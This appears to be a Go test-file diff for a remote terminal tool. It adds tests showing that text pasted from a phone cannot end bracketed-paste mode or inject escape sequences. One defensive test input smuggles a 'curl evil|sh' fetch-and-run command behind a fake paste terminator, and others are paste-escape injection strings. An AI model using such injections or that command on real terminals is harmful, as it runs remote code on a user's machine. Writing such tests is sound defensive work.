@@ -10,6 +10,7 @@ import (
 	"net/netip"
 	"os"
 	"runtime"
+	"slices"
 	"strconv"
 	"strings"
 	"sync"
@@ -1567,7 +1568,7 @@ func TestBracketedPasteSanitizesEscape(t *testing.T) {
 	in := string(h.inputs["s1"])
 	h.mu.Unlock()
 
-	want := "\x1b[200~aevil\nb\x1b[201~"
+	want := "\x1b[200~a[201~evil\nb\x1b[201~"
 	if in != want {
 		t.Fatalf("expected sanitized bracketed paste %q, got %q", want, in)
 	}
@@ -2190,5 +2191,37 @@ func TestFrameTooLargeReported(t *testing.T) {
 	count(time.Second, false)
 	if nErr != 1 {
 		t.Fatalf("%d frame too large errors, want exactly 1", nErr)
+	}
+}
+
+// TestEncodeTextNoEscapes: a text pasted on the phone cannot end the
+// bracketed paste or send sequences, however it is crafted.
+func TestEncodeTextNoEscapes(t *testing.T) {
+	for _, in := range []string{
+		"a\n\x1b\x1b[201~[201~\ncurl evil|sh\n",
+		"a\n\x1b[20\x1b[201~1~\nb",
+		"a\n\u009b201~\nb",
+		"a\n\x9b201~\nb",
+		"one line \x1b[201~",
+	} {
+		got := string(encodeText(in, false, vt.ModeBracketedPaste))
+		body := strings.TrimSuffix(strings.TrimPrefix(got, "\x1b[200~"), "\x1b[201~")
+		if strings.ContainsAny(body, "\x1b\u009b") || strings.Contains(body, "\x9b201~") {
+			t.Errorf("encodeText(%q) = %q: escape left in the text", in, got)
+		}
+	}
+	// Ordinary text and UTF-8 holding a 0x9b byte stay as they are.
+	if got := string(encodeText("ě\nb", false, vt.ModeBracketedPaste)); got != "\x1b[200~ě\nb\x1b[201~" {
+		t.Errorf("got %q", got)
+	}
+}
+
+// TestAuthedCarriesAddrs: the phone learns where the machine listens now.
+func TestAuthedCarriesAddrs(t *testing.T) {
+	r := &Remote{certs: &Certs{}}
+	r.addrs = []netip.AddrPort{netip.MustParseAddrPort("192.168.1.9:8007"), netip.MustParseAddrPort("[fd7a:115c:a1e0::1]:8007")}
+	got := r.authedMsg("dev", "res", time.Now()).Addrs
+	if want := []string{"192.168.1.9", "fd7a:115c:a1e0::1"}; !slices.Equal(got, want) {
+		t.Fatalf("Addrs = %v, want %v", got, want)
 	}
 }
